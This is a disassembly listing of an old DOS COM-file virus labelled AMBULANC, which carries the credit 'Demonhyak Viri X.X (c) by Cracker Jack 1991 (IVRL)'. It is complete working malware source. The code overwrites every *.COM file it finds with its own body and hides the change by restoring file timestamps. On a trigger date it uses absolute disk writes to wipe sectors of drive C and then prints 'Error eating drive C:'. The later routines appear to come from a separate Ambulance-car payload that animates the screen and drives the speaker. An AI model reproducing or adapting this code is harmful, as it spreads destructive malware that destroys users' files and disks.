                PAGE  60,132
  
                ;==========================================================================
                ;==                                      ==
                ;==                 AMBULANC                     ==
                ;==                                      ==
                ;==      Created:   20-Nov-88                            ==
                ;==      Passes:    5          Analysis Flags on: ABCIP              ==
                ;==                                      ==
                ;==========================================================================
  
                .286c
  
     = 000C         data_1e     equ 0Ch         ; (0040:000C=0)
     = 0049         data_2e     equ 49h         ; (0040:0049=3)
     = 006C         data_3e     equ 6Ch         ; (0040:006C=6734h)
     = 4F43         data_16e    equ 4F43h           ; (6BD5:4F43=0)
  
                seg_a       segment
                        assume  cs:seg_a, ds:seg_a
  
  
                        org 100h
  
                ambulanc    proc    far
  
6BD5:0100           start:
6BD5:0100  BA 01B2              mov dx,1B2h
6BD5:0103  B4 4E                mov ah,4Eh          ; 'N'
6BD5:0105  B9 110B              mov cx,110Bh
6BD5:0108  CD 21                int 21h         ; DOS Services  ah=function 4Eh
                                        ;  find 1st filenam match @ds:dx
6BD5:010A  90                   nop
6BD5:010B  73 02                jnc loc_1           ; Jump if carry=0
6BD5:010D  EB 11                jmp short loc_3     ; (0120)
6BD5:010F           loc_1:
6BD5:010F  E8 0049              call    sub_1           ; (015B)
6BD5:0112  BA 0080              mov dx,80h
6BD5:0115  B4 4F                mov ah,4Fh          ; 'O'
6BD5:0117  CD 21                int 21h         ; DOS Services  ah=function 4Fh
                                        ;  find next filename match
6BD5:0119  90                   nop
6BD5:011A  73 02                jnc loc_2           ; Jump if carry=0
6BD5:011C  EB 02                jmp short loc_3     ; (0120)
6BD5:011E           loc_2:
6BD5:011E  EB EF                jmp short loc_1     ; (010F)
6BD5:0120           loc_3:
6BD5:0120  B4 2A                mov ah,2Ah          ; '*'
6BD5:0122  CD 21                int 21h         ; DOS Services  ah=function 2Ah
                                        ;  get date, cx=year, dx=mon/day
6BD5:0124  3C 02                cmp al,2
6BD5:0126  74 04                je  loc_4           ; Jump if equal
6BD5:0128  B4 4C                mov ah,4Ch          ; 'L'
6BD5:012A  CD 21                int 21h         ; DOS Services  ah=function 4Ch
                                        ;  terminate with al=return code
6BD5:012C           loc_4:
6BD5:012C  C6 06 01BE 00            mov byte ptr data_7,0   ; (6BD5:01BE=0)
     ambulanc.lst                   Sourcer Listing v1.80        6-Mar-93    8:24 pm       Page 2

6BD5:0131  90                   nop
6BD5:0132  EB 01                jmp short loc_5     ; (0135)
6BD5:0134  90                   nop
6BD5:0135           loc_5:
6BD5:0135  A0 01BF              mov al,data_8       ; (6BD5:01BF=2)
6BD5:0138  B9 00A0              mov cx,0A0h
6BD5:013B  BA 0000              mov dx,0
6BD5:013E  BB 0000              mov bx,0
6BD5:0141  CD 26                int 26h         ; Absolute disk write, drive al
6BD5:0143  FE 06 01BE               inc data_7          ; (6BD5:01BE=0)
6BD5:0147  80 3E 01BE 0A            cmp byte ptr data_7,0Ah ; (6BD5:01BE=0)
6BD5:014C  74 02                je  loc_6           ; Jump if equal
6BD5:014E  75 E5                jnz loc_5           ; Jump if not zero
6BD5:0150           loc_6:
6BD5:0150  B4 09                mov ah,9
6BD5:0152 .BA 01F6              mov dx,offset data_9    ; (6BD5:01F6=0Ah)
6BD5:0155  CD 21                int 21h         ; DOS Services  ah=function 09h
                                        ;  display char string at ds:dx
6BD5:0157  B4 4C                mov ah,4Ch          ; 'L'
6BD5:0159  CD 21                int 21h         ; DOS Services  ah=function 4Ch
                                        ;  terminate with al=return code
  
                ambulanc    endp
  
                ;==========================================================================
                ;                  SUBROUTINE
                ;==========================================================================
  
                sub_1       proc    near
6BD5:015B  BA 009E              mov dx,9Eh
6BD5:015E  B8 4300              mov ax,4300h
6BD5:0161  CD 21                int 21h         ; DOS Services  ah=function 43h
                                        ;  get/set file attrb, nam@ds:dx
6BD5:0163  89 0E 01BC               mov data_6,cx       ; (6BD5:01BC=20h)
6BD5:0167  90                   nop
6BD5:0168  33 C9                xor cx,cx           ; Zero register
6BD5:016A  B8 4301              mov ax,4301h
6BD5:016D  CD 21                int 21h         ; DOS Services  ah=function 43h
                                        ;  get/set file attrb, nam@ds:dx
6BD5:016F  90                   nop
6BD5:0170  B8 3D02              mov ax,3D02h
6BD5:0173  CD 21                int 21h         ; DOS Services  ah=function 3Dh
                                        ;  open file, al=mode,name@ds:dx
6BD5:0175  90                   nop
6BD5:0176  72 A8                jc  loc_3           ; Jump if carry Set
6BD5:0178  8B D8                mov bx,ax
6BD5:017A  B8 5700              mov ax,5700h
6BD5:017D  CD 21                int 21h         ; DOS Services  ah=function 57h
                                        ;  get/set file date & time
6BD5:017F  90                   nop
6BD5:0180  89 0E 01BA               mov data_5,cx       ; (6BD5:01BA=22B6h)
6BD5:0184  89 16 01B8               mov data_4,dx       ; (6BD5:01B8=1174h)
6BD5:0188  BA 0100              mov dx,100h
6BD5:018B  B4 40                mov ah,40h          ; '@'
6BD5:018D  B9 0110              mov cx,110h
6BD5:0190  CD 21                int 21h         ; DOS Services  ah=function 40h
                                        ;  write file cx=bytes, to ds:dx
6BD5:0192  90                   nop
     ambulanc.lst                   Sourcer Listing v1.80        6-Mar-93    8:24 pm       Page 3

6BD5:0193  B8 5701              mov ax,5701h
6BD5:0196  8B 16 01B8               mov dx,data_4       ; (6BD5:01B8=1174h)
6BD5:019A  8B 0E 01BA               mov cx,data_5       ; (6BD5:01BA=22B6h)
6BD5:019E  CD 21                int 21h         ; DOS Services  ah=function 57h
                                        ;  get/set file date & time
6BD5:01A0  B4 3E                mov ah,3Eh          ; '>'
6BD5:01A2  CD 21                int 21h         ; DOS Services  ah=function 3Eh
                                        ;  close file, bx=file handle
6BD5:01A4  90                   nop
6BD5:01A5  BA 009E              mov dx,9Eh
6BD5:01A8  8B 0E 01BC               mov cx,data_6       ; (6BD5:01BC=20h)
6BD5:01AC  B8 4301              mov ax,4301h
6BD5:01AF  CD 21                int 21h         ; DOS Services  ah=function 43h
                                        ;  get/set file attrb, nam@ds:dx
6BD5:01B1  C3                   retn
                sub_1       endp
  
6BD5:01B2  2A 2E 43 4F 4D 00                    db      '*.COM',0
6BD5:01B8  74 11                                add     [si+11h],dh
6BD5:01BA  22B6         data_5      dw  22B6h
6BD5:01BC  0020         data_6      dw  20h
6BD5:01BE  00           data_7      db  0
6BD5:01BF  02           data_8      db  2
6BD5:01C0  00 00                db  0, 0
6BD5:01C2  44 65 6D 6F 6E 68            db  'Demonhyak Viri X.X (c) by Cracke'
6BD5:01C8  79 61 6B 20 56 69
6BD5:01CE  72 69 20 58 2E 58
6BD5:01D4  20 28 63 29 20 62
6BD5:01DA  79 20 43 72 61 63
6BD5:01E0  6B 65
6BD5:01E2  72 20 4A 61 63 6B            db  'r Jack 1991 (IVRL)'
6BD5:01E8  20 31 39 39 31 20
6BD5:01EE  28 49 56 52 4C 29
6BD5:01F4  00 00                db  0, 0
6BD5:01F6  0A 0D 45 72 72 6F    data_9      db  0Ah, 0Dh, 'Error eating drive C:', 0Ah
6BD5:01FC  72 20 65 61 74 69
6BD5:0202  6E 67 20 64 72 69
6BD5:0208  76 65 20 43 3A 0A
6BD5:020E  0D 24                db  0Dh, '$'
6BD5:0210  8B 9C 17 04 33 C9            db  8Bh, 9Ch, 17h, 4, 33h, 0C9h
6BD5:0216  33 D2 B8 00 42 CD            db  33h, 0D2h, 0B8h, 0, 42h, 0CDh
6BD5:021C  21 8B 9C 17 04 B9            db  21h, 8Bh, 9Ch, 17h, 4, 0B9h
6BD5:0222  03 00 8D 94 11 04            db  3, 0, 8Dh, 94h, 11h, 4
6BD5:0228  B4 40 CD 21 5A 59            db  0B4h, 40h, 0CDh, 21h, 5Ah, 59h
6BD5:022E  8B 9C 17 04 B8 01            db  8Bh, 9Ch, 17h, 4, 0B8h, 1
6BD5:0234  57 CD 21 8B 9C 17            db  57h, 0CDh, 21h, 8Bh, 9Ch, 17h
6BD5:023A  04 B4 3E CD 21 C3            db  4, 0B4h, 3Eh, 0CDh, 21h, 0C3h
6BD5:0240  A1 2C 00 8E C0 1E            db  0A1h, 2Ch, 0, 8Eh, 0C0h, 1Eh
6BD5:0246  B8 40 00 8E D8 8B            db  0B8h, 40h, 0, 8Eh, 0D8h, 8Bh
6BD5:024C  2E 6C 00 1F F7 C5            db  2Eh, 6Ch, 0, 1Fh, 0F7h, 0C5h
6BD5:0252  03 00 74 17 33 DB            db  3, 0, 74h, 17h, 33h, 0DBh
6BD5:0258           loc_7:
6BD5:0258  26:8B 07             mov ax,es:[bx]
6BD5:025B  3D 4150              cmp ax,4150h
6BD5:025E  75 08                jne loc_8           ; Jump if not equal
6BD5:0260  26:81 7F 02 4854         cmp word ptr es:[bx+2],4854h
6BD5:0266  74 0B                je  loc_10          ; Jump if equal
     ambulanc.lst                   Sourcer Listing v1.80        6-Mar-93    8:24 pm       Page 4

6BD5:0268           loc_8:
6BD5:0268  43                   inc bx
6BD5:0269  0B C0                or  ax,ax           ; Zero ?
6BD5:026B  75 EB                jnz loc_7           ; Jump if not zero
6BD5:026D           loc_9:
6BD5:026D  8D BC 0428               lea di,cs:[428h][si]    ; Load effective addr
6BD5:0271  EB 32                jmp short loc_15        ; (02A5)
6BD5:0273           loc_10:
6BD5:0273  83 C3 05             add bx,5
6BD5:0276           loc_11:
6BD5:0276  8D BC 0428               lea di,cs:[428h][si]    ; Load effective addr
6BD5:027A           loc_12:
6BD5:027A  26:8A 07             mov al,es:[bx]
6BD5:027D  43                   inc bx
6BD5:027E  0A C0                or  al,al           ; Zero ?
6BD5:0280  74 19                jz  loc_14          ; Jump if zero
6BD5:0282  3C 3B                cmp al,3Bh          ; ';'
6BD5:0284  74 05                je  loc_13          ; Jump if equal
6BD5:0286  88 05                mov [di],al
6BD5:0288  47                   inc di
6BD5:0289  EB EF                jmp short loc_12        ; (027A)
6BD5:028B           loc_13:
6BD5:028B  26:80 3F 00              cmp byte ptr es:[bx],0
6BD5:028F  74 0A                je  loc_14          ; Jump if equal
6BD5:0291  D1 ED                shr bp,1            ; Shift w/zeros fill
6BD5:0293  D1 ED                shr bp,1            ; Shift w/zeros fill
6BD5:0295  F7 C5 0003               test    bp,3
6BD5:0299  75 DB                jnz loc_11          ; Jump if not zero
6BD5:029B           loc_14:
6BD5:029B  80 7D FF 5C              cmp byte ptr [di-1],5Ch ; '\'
6BD5:029F  74 04                je  loc_15          ; Jump if equal
6BD5:02A1  C6 05 5C             mov byte ptr [di],5Ch   ; '\'
6BD5:02A4  47                   inc di
6BD5:02A5           loc_15:
6BD5:02A5  1E                   push    ds
6BD5:02A6  07                   pop es
6BD5:02A7  89 BC 0422               mov data_12[si],di      ; (6BD5:0422=2FE9h)
6BD5:02AB  B8 2E2A              mov ax,2E2Ah
6BD5:02AE  AB                   stosw               ; Store ax to es:[di]
6BD5:02AF  B8 4F43              mov ax,4F43h
6BD5:02B2  AB                   stosw               ; Store ax to es:[di]
6BD5:02B3  B8 004D              mov ax,4Dh
6BD5:02B6  AB                   stosw               ; Store ax to es:[di]
6BD5:02B7  06                   push    es
6BD5:02B8  B4 2F                mov ah,2Fh          ; '/'
6BD5:02BA  CD 21                int 21h         ; DOS Services  ah=function 2Fh
                                        ;  get DTA ptr into es:bx
6BD5:02BC  8C C0                mov ax,es
6BD5:02BE  89 84 0424               mov data_13[si],ax      ; (6BD5:0424=6D30h)
6BD5:02C2  89 9C 0426               mov data_14[si],bx      ; (6BD5:0426=3332h)
6BD5:02C6  07                   pop es
6BD5:02C7  8D 94 0478               lea dx,cs:[478h][si]    ; Load effective addr
6BD5:02CB  B4 1A                mov ah,1Ah
6BD5:02CD  CD 21                int 21h         ; DOS Services  ah=function 1Ah
                                        ;  set DTA to ds:dx
6BD5:02CF  8D 94 0428               lea dx,cs:[428h][si]    ; Load effective addr
6BD5:02D3  33 C9                xor cx,cx           ; Zero register
6BD5:02D5  B4 4E                mov ah,4Eh          ; 'N'
     ambulanc.lst                   Sourcer Listing v1.80        6-Mar-93    8:24 pm       Page 5

6BD5:02D7  CD 21                int 21h         ; DOS Services  ah=function 4Eh
                                        ;  find 1st filenam match @ds:dx
6BD5:02D9  73 08                jnc loc_16          ; Jump if carry=0
6BD5:02DB  33 C0                xor ax,ax           ; Zero register
6BD5:02DD  89 84 0428               mov data_15[si],ax      ; (6BD5:0428=0E125h)
6BD5:02E1  EB 29                jmp short loc_19        ; (030C)
6BD5:02E3           loc_16:
6BD5:02E3  1E                   push    ds
6BD5:02E4  B8 0040              mov ax,40h
6BD5:02E7  8E D8                mov ds,ax
6BD5:02E9  D1 CD                ror bp,1            ; Rotate
6BD5:02EB  33 2E 006C               xor bp,ds:data_3e       ; (0040:006C=673Ah)
6BD5:02EF  1F                   pop ds
6BD5:02F0  F7 C5 0007               test    bp,7
6BD5:02F4  74 06                jz  loc_17          ; Jump if zero
6BD5:02F6  B4 4F                mov ah,4Fh          ; 'O'
6BD5:02F8  CD 21                int 21h         ; DOS Services  ah=function 4Fh
                                        ;  find next filename match
6BD5:02FA  73 E7                jnc loc_16          ; Jump if carry=0
6BD5:02FC           loc_17:
6BD5:02FC  8B BC 0422               mov di,data_12[si]      ; (6BD5:0422=2FE9h)
6BD5:0300  8D 9C 0496               lea bx,cs:[496h][si]    ; Load effective addr
6BD5:0304           loc_18:
6BD5:0304  8A 07                mov al,[bx]
6BD5:0306  43                   inc bx
6BD5:0307  AA                   stosb               ; Store al to es:[di]
6BD5:0308  0A C0                or  al,al           ; Zero ?
6BD5:030A  75 F8                jnz loc_18          ; Jump if not zero
6BD5:030C           loc_19:
6BD5:030C  8B 9C 0426               mov bx,data_14[si]      ; (6BD5:0426=3332h)
6BD5:0310  8B 84 0424               mov ax,data_13[si]      ; (6BD5:0424=6D30h)
6BD5:0314  1E                   push    ds
6BD5:0315  8E D8                mov ds,ax
6BD5:0317  B4 1A                mov ah,1Ah
6BD5:0319  CD 21                int 21h         ; DOS Services  ah=function 1Ah
                                        ;  set DTA to ds:dx
6BD5:031B  1F                   pop ds
6BD5:031C  C3                   retn
6BD5:031D  06                   push    es
6BD5:031E  8B 84 040F               mov ax,data_10[si]      ; (6BD5:040F=0E7E6h)
6BD5:0322  25 0007              and ax,7
6BD5:0325  3D 0006              cmp ax,6
6BD5:0328  75 15                jne loc_20          ; Jump if not equal
6BD5:032A  B8 0040              mov ax,40h
6BD5:032D  8E C0                mov es,ax
6BD5:032F  26:A1 000C               mov ax,es:data_1e       ; (0040:000C=0)
6BD5:0333  0B C0                or  ax,ax           ; Zero ?
6BD5:0335  75 08                jnz loc_20          ; Jump if not zero
6BD5:0337  26:FF 06 000C            inc word ptr es:data_1e ; (0040:000C=0)
6BD5:033C  E8 0002              call    sub_2           ; (0341)
6BD5:033F           loc_20:
6BD5:033F  07                   pop es
6BD5:0340  C3                   retn
  
                ;==========================================================================
                ;                  SUBROUTINE
                ;==========================================================================
  
     ambulanc.lst                   Sourcer Listing v1.80        6-Mar-93    8:24 pm       Page 6

                sub_2       proc    near
6BD5:0341  1E                   push    ds
6BD5:0342  BF B800              mov di,0B800h
6BD5:0345  B8 0040              mov ax,40h
6BD5:0348  8E D8                mov ds,ax
6BD5:034A  A0 0049              mov al,ds:data_2e       ; (0040:0049=3)
6BD5:034D  3C 07                cmp al,7
6BD5:034F  75 03                jne loc_21          ; Jump if not equal
6BD5:0351  BF B000              mov di,0B000h
6BD5:0354           loc_21:
6BD5:0354  8E C7                mov es,di
6BD5:0356  1F                   pop ds
6BD5:0357  BD FFF0              mov bp,0FFF0h
6BD5:035A           loc_22:
6BD5:035A  BA 0000              mov dx,0
6BD5:035D  B9 0010              mov cx,10h
  
6BD5:0360           locloop_23:
6BD5:0360  E8 003F              call    sub_5           ; (03A2)
6BD5:0363  42                   inc dx
6BD5:0364  E2 FA                loop    locloop_23      ; Loop if cx > 0
  
6BD5:0366  E8 0016              call    sub_4           ; (037F)
6BD5:0369  E8 007B              call    sub_6           ; (03E7)
6BD5:036C  45                   inc bp
6BD5:036D  83 FD 50             cmp bp,50h
6BD5:0370  75 E8                jne loc_22          ; Jump if not equal
6BD5:0372  E8 0003              call    sub_3           ; (0378)
6BD5:0375  1E                   push    ds
6BD5:0376  07                   pop es
6BD5:0377  C3                   retn
                sub_2       endp
  
  
                ;==========================================================================
                ;                  SUBROUTINE
                ;==========================================================================
  
                sub_3       proc    near
6BD5:0378  E4 61                in  al,61h          ; port 61h, 8255 port B, read
6BD5:037A  24 FC                and al,0FCh
6BD5:037C  E6 61                out 61h,al          ; port 61h, 8255 B - spkr, etc
                                        ;  al = 0, disable parity
6BD5:037E  C3                   retn
                sub_3       endp
  
  
                ;==========================================================================
                ;                  SUBROUTINE
                ;==========================================================================
  
                sub_4       proc    near
6BD5:037F  BA 07D0              mov dx,7D0h
6BD5:0382  F7 C5 0004               test    bp,4
6BD5:0386  74 03                jz  loc_24          ; Jump if zero
6BD5:0388  BA 0BB8              mov dx,0BB8h
6BD5:038B           loc_24:
6BD5:038B  E4 61                in  al,61h          ; port 61h, 8255 port B, read
     ambulanc.lst                   Sourcer Listing v1.80        6-Mar-93    8:24 pm       Page 7

6BD5:038D  A8 03                test    al,3
6BD5:038F  75 08                jnz loc_25          ; Jump if not zero
6BD5:0391  0C 03                or  al,3
6BD5:0393  E6 61                out 61h,al          ; port 61h, 8255 B - spkr, etc
6BD5:0395  B0 B6                mov al,0B6h
6BD5:0397  E6 43                out 43h,al          ; port 43h, 8253 wrt timr mode
6BD5:0399           loc_25:
6BD5:0399  8B C2                mov ax,dx
6BD5:039B  E6 42                out 42h,al          ; port 42h, 8253 timer 2 spkr
6BD5:039D  88 E0                mov al,ah
6BD5:039F  E6 42                out 42h,al          ; port 42h, 8253 timer 2 spkr
6BD5:03A1  C3                   retn
                sub_4       endp
  
  
                ;==========================================================================
                ;                  SUBROUTINE
                ;==========================================================================
  
                sub_5       proc    near
6BD5:03A2  51                   push    cx
6BD5:03A3  52                   push    dx
6BD5:03A4  8D 9C 03BF               lea bx,cs:[3BFh][si]    ; Load effective addr
6BD5:03A8  03 DA                add bx,dx
6BD5:03AA  01 EA                add dx,bp
6BD5:03AC  0B D2                or  dx,dx           ; Zero ?
6BD5:03AE  78 34                js  loc_28          ; Jump if sign=1
6BD5:03B0  83 FA 50             cmp dx,50h
6BD5:03B3  73 2F                jae loc_28          ; Jump if above or =
6BD5:03B5  BF 0C80              mov di,0C80h
6BD5:03B8  03 FA                add di,dx
6BD5:03BA  03 FA                add di,dx
6BD5:03BC  29 EA                sub dx,bp
6BD5:03BE  B9 0005              mov cx,5
  
6BD5:03C1           locloop_26:
6BD5:03C1  B4 07                mov ah,7
6BD5:03C3  8A 07                mov al,[bx]
6BD5:03C5  2C 07                sub al,7
6BD5:03C7  02 C1                add al,cl
6BD5:03C9  28 D0                sub al,dl
6BD5:03CB  83 F9 05             cmp cx,5
6BD5:03CE  75 0A                jne loc_27          ; Jump if not equal
6BD5:03D0  B4 0F                mov ah,0Fh
6BD5:03D2  F7 C5 0003               test    bp,3
6BD5:03D6  74 02                jz  loc_27          ; Jump if zero
6BD5:03D8  B0 20                mov al,20h          ; ' '
6BD5:03DA           loc_27:
6BD5:03DA  AB                   stosw               ; Store ax to es:[di]
6BD5:03DB  83 C3 10             add bx,10h
6BD5:03DE  81 C7 009E               add di,9Eh
6BD5:03E2  E2 DD                loop    locloop_26      ; Loop if cx > 0
  
6BD5:03E4           loc_28:
6BD5:03E4  5A                   pop dx
6BD5:03E5  59                   pop cx
6BD5:03E6  C3                   retn
                sub_5       endp
     ambulanc.lst                   Sourcer Listing v1.80        6-Mar-93    8:24 pm       Page 8

  
  
                ;==========================================================================
                ;                  SUBROUTINE
                ;==========================================================================
  
                sub_6       proc    near
6BD5:03E7  1E                   push    ds
6BD5:03E8  B8 0040              mov ax,40h
6BD5:03EB  8E D8                mov ds,ax
6BD5:03ED  A1 006C              mov ax,ds:data_3e       ; (0040:006C=673Eh)
6BD5:03F0           loc_29:
6BD5:03F0  3B 06 006C               cmp ax,ds:data_3e       ; (0040:006C=673Eh)
6BD5:03F4  74 FA                je  loc_29          ; Jump if equal
6BD5:03F6  1F                   pop ds
6BD5:03F7  C3                   retn
                sub_6       endp
  
6BD5:03F8  22 23                and ah,[bp+di]
6BD5:03FA  24 25                and al,25h          ; '%'
6BD5:03FC  26                   db  26h         ; es:
6BD5:03FD  27                   daa             ; Decimal adjust
6BD5:03FE  28 29                sub [bx+di],ch
6BD5:0400  66 87 3B 2D 2E 2F            db  66h, 87h, 3Bh, 2Dh, 2Eh, 2Fh
6BD5:0406  30 31 23 E0 E1 E2            db  30h, 31h, 23h, 0E0h, 0E1h, 0E2h
6BD5:040C  E3 E4 E5             db  0E3h, 0E4h, 0E5h
6BD5:040F  E7E6         data_10     dw  0E7E6h          ; Data table (indexed access)
6BD5:0411  E7 E9 EA EB 30 31            db  0E7h, 0E9h, 0EAh, 0EBh, 30h, 31h
6BD5:0417  2432         data_11     dw  2432h           ; Data table (indexed access)
6BD5:0419  E0 E1 E2 E3 E8 2A            db  0E0h, 0E1h, 0E2h, 0E3h, 0E8h, 2Ah
6BD5:041F  EA E7 E8             db  0EAh, 0E7h, 0E8h
6BD5:0422  2FE9         data_12     dw  2FE9h           ; Data table (indexed access)
6BD5:0424  6D30         data_13     dw  6D30h           ; Data table (indexed access)
6BD5:0426  3332         data_14     dw  3332h           ; Data table (indexed access)
6BD5:0428  E125         data_15     dw  0E125h          ; Data table (indexed access)
6BD5:042A  E2 E3 E4 E5 E7 E7            db  0E2h, 0E3h, 0E4h, 0E5h, 0E7h, 0E7h
6BD5:0430  E8 E9 EA EB EC ED            db  0E8h, 0E9h, 0EAh, 0EBh, 0ECh, 0EDh
6BD5:0436  EE EF 26 E6 E7 29            db  0EEh, 0EFh, 26h, 0E6h, 0E7h, 29h
6BD5:043C  59 5A 2C EC ED EE            db  59h, 5Ah, 2Ch, 0ECh, 0EDh, 0EEh
6BD5:0442  EF F0 32 62 34 F4            db  0EFh, 0F0h, 32h, 62h, 34h, 0F4h
6BD5:0448  09 00 E9 36 00 EB            db  9, 0, 0E9h, 36h, 0, 0EBh
6BD5:044E  2E 90 05 00 EB 2E            db  2Eh, 90h, 5, 0, 0EBh, 2Eh
6BD5:0454  90                   db  90h
  
                seg_a       ends
  
  
  
                        end start
                        